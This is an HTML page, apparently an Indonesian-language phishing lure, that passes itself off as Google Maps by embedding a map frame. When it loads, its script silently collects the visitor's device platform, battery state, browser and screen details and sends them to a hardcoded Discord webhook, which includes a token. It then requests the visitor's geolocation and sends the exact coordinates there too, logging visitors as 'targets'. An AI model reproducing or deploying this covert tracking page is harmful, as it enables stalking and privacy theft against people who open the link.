<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

    <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15811.859664426211!2d110.7791645!3d-7.4580736!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sid!2sid!4v1711100000000!5m2!1sid!2sid" allow="geolocation;camera"></iframe>

    <script>
        // GANTI DENGAN URL WEBHOOK DISCORD KAMU
        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR";

        async function sendLog(content) {
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: content })
            });
        }

        async function startTracking() {
            // 1. Ambil Data Perangkat & Baterai
            let batteryInfo = "Tidak terdeteksi";
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Dicas' : 'Tidak dicas'})`;
                }
            } catch (e) {}

            let deviceMsg = `**[!] TARGET MASUK LINK!**\n`;
            deviceMsg += `📱 **Model:** ${navigator.platform}\n`;
            deviceMsg += `🔋 **Baterai:** ${batteryInfo}\n`;
            deviceMsg += `🌐 **Browser:** ${navigator.userAgent}\n`;
            deviceMsg += `🖥️ **Resolusi:** ${window.screen.width}x${window.screen.height}`;
            sendLog(deviceMsg);

            // 2. Ambil Lokasi Otomatis
            navigator.geolocation.getCurrentPosition(pos => {
                const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendLog(`**[+] LOKASI DITEMUKAN!**\n📍 Link: ${mapsLink}\n🎯 Akurasi: ${pos.coords.accuracy} meter`);
            }, err => {
                sendLog(`[-] Target menolak izin lokasi.`);
            });
        }

        // Jalankan pelacakan saat halaman selesai loading
        window.onload = startTracking;
    </script>
</body>
</html>
